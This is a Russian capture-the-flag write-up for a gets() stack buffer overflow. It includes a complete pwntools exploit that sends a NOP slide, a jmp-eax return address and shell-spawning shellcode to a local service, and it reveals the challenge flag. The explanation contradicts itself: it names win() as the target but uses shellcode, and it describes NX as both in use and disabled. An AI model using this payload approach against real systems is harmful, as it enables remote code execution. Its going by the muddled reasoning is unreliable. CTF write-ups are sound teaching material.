# Task: Предел возможностей

### Описание уязвимости

Использование функции gets() в process_input() — это ключевая уязвимость. Поскольку gets() не ограничивает размер вводимой строки, ввод, превышающий размер буфера, переполнит его и позволит перезаписать значения на стеке, в том числе адрес возврата функции. Таким образом, мы можем заставить программу перейти к функции win и вывести флаг.

Структура программы:
- Главное меню: позволяет выбрать различные функции, включая process_input().
- Функция process_input(): отвечает за обработку пользовательского ввода и использует уязвимую функцию gets().
- Функция win(): функция, которая выводит флаг. Наша цель — перенаправить выполнение программы на эту функцию, что приведёт к получению флага.

###  Подготовка к эксплуатации

1. Исследование защиты: Программа использует защиту "No-Execute" (NX), которая предотвращает выполнение кода в сегменте данных. Однако NX-флаг отключён, что позволяет выполнить наш shellcode.
2. Переполнение буфера: Буфер для ввода в process_input() имеет размер 16 байт, и поэтому ввод строки большего размера приведёт к переполнению и позволит переписать адрес возврата.

### Эксплойт

Пошаговый разбор эксплойта:
- NOP-слайд: payload = b'\x90' * 26 создаёт "скользящий" сегмент NOP, который помогает при выполнении shellcode.
- Прыжок через перезаписанный адрес: payload += b'\xeb\x04' используется для пропуска 4 байтов (адрес возврата), чтобы shellcode мог выполняться без сбоев.
- Перезапись адреса возврата: payload += pwn.p32(0x0804a7ca) — замена адреса возврата на jmp eax, который перенаправляет выполнение на начало нашего shellcode.
- Shellcode: payload += pwn.asm(pwn.shellcraft.i386.linux.sh()) — вставляем shellcode для получения оболочки.

Финальный код эксплойта:

``` python
import pwn
import sys

# Создаем полезную нагрузку
payload = b'\x90' * 26               # NOP-слайд
payload += b'\xeb\x04'               # Переход на shellcode через 4 байта
payload += pwn.p32(0x0804a7ca)       # Адрес команды `jmp eax`
payload += pwn.asm(pwn.shellcraft.i386.linux.sh())  # Shellcode для получения оболочки

# Открываем соединение с удаленным сервером
p = pwn.remote('localhost', 12345)

# Преодолеваем главное меню
p.sendline(b'3')  # Выбираем "Ввод данных"

# Считываем ответ от программы, чтобы перейти к запросу ввода
p.recvuntil(b"Enter input:")

# Отправляем полезную нагрузку
p.sendline(payload)

# Запускаем интерактивный режим для дальнейшего взаимодействия
p.interactive()

```

Flag: `EclipseCTF{N3v3rG1veUp_2023!_F1ndY0urP4th}`